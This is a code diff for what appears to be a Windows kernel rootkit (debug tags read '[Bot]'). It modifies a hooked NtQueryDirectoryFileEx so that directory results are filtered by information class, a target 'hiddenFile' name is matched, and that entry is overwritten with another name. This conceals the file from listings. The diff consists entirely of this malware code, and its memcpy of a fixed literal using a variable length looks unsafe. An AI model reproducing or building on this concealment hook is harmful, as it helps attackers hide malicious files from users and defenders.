@@ -48,6 +48,8 @@ static void getFileName(PUNICODE_STRING filename, PVOID fileInfo, FILE_INFORMATI
 			filename->Length = 0;
 			break;
 	}
+
+	filename->MaximumLength = filename->Length;
 }
 
 NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
@@ -67,9 +69,25 @@ NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 
 	status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
 
-	getFileName(&us, FileInformation, FileInformationClass);
+	if (NT_SUCCESS(status) && (
+		FileInformationClass == FileDirectoryInformation ||
+		FileInformationClass == FileFullDirectoryInformation ||
+		FileInformationClass == FileBothDirectoryInformation ||
+		FileInformationClass == FileNamesInformation ||
+		FileInformationClass == FileIdBothDirectoryInformation ||
+		FileInformationClass == FileIdFullDirectoryInformation ||
+		FileInformationClass == FileIdGlobalTxDirectoryInformation ||
+		FileInformationClass == FileIdExtdDirectoryInformation ||
+		FileInformationClass == FileIdExtdBothDirectoryInformation)) {
 
-	DbgPrintEx(0, 0, "[Bot] dir hook %wZ\n", us);
+		getFileName(&us, FileInformation, FileInformationClass);
+		DbgPrintEx(0, 0, "[Bot] dir hook %wZ\n", us);
+		if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
+			memcpy(us.Buffer, L"lolol.txt", us.Length);
+			DbgPrintEx(0, 0, "[Bot] ----------------YES--------------------\n");
+		}
+	}
+
 	
 	return status;
 }
